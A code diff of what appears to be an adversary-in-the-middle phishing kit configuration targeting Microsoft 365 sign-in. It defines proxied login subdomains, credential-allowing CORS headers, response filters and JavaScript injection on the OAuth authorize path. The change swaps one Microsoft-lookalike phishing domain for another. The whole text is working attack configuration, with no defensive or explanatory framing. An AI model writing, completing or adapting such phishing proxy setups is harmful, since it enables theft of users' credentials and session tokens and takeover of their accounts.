@@ -10,7 +10,7 @@ proxy_hosts:
   - {phish_sub: 'mysignins', orig_sub: 'mysignins', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
 
 custom_headers:
-  - {name: 'Access-Control-Allow-Origin', value: 'https://login.googledevelopertoolkit.com', direction: 'response'}
+  - {name: 'Access-Control-Allow-Origin', value: 'https://login.azuretechnology.microsoftaitech.com', direction: 'response'}
   - {name: 'Access-Control-Allow-Methods', value: 'GET, POST', direction: 'response'}
   - {name: 'Access-Control-Allow-Headers', value: 'Content-Type', direction: 'response'}
   - {name: 'Access-Control-Allow-Credentials', value: 'true', direction: 'response'}
@@ -25,7 +25,7 @@ sub_filters:
 - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
 
 js_inject:
-  - trigger_domains: ['login.microsoftonline.com', 'login.googledevelopertoolkit.com']
+  - trigger_domains: ['login.microsoftonline.com', 'login.azuretechnology.microsoftaitech.com']
     # FIXED: Added a universal wildcard regex catch-all for both endpoint roots
     trigger_paths: 
       - '/common/oauth2/v2.0/authorize'
